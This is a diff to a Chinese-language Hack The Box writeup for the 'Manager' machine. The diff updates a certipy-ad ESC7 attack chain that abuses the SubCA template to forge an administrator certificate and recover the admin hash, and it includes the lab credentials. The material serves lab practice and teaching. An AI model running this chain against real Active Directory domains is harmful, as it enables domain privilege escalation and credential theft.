@@ -586,11 +586,16 @@ certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username 'raven@mana
 #启用名为 SubCA 的证书模板。这个模板通常用于签发子CA证书。
 certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn 'administrator@manager.htb'
 #执行这个命令后,将向 manager-DC01-CA 证书颁发机构请求签发一个新的子 CA 证书。这个子 CA 证书将被颁发给域 manager.htb,并使用启用的 SubCA 模板进行签发。同时,证书中将包含 administrator@manager.htb 的用户主体名称(UPN)。
-certipy-ad ca -ca 'manager-DC01-CA' -issue-request 17 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123*'
+certipy-ad ca -ca 'manager-DC01-CA' -issue-request 23 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123*'
 #这块一直失败Got access denied trying to issue certificate....manager-DC01-CA 证书颁发机构将签发之前通过 certipy-ad req 命令提交的请求ID为17的证书请求，并生成一个新的子CA证书。
-certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 17
-#
+certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 23
+#是使用指定的用户名和密码，在指定的证书颁发机构（CA）上请求一个证书，并将该证书检索回来
+certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
 ```
+
+最后获取admin的密码hash
+`certipy-ad auth -pfx administrator.pfx  -dc-ip 10.10.11.236`
+
 ### Sandworm
 #### user
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230722155953.png)
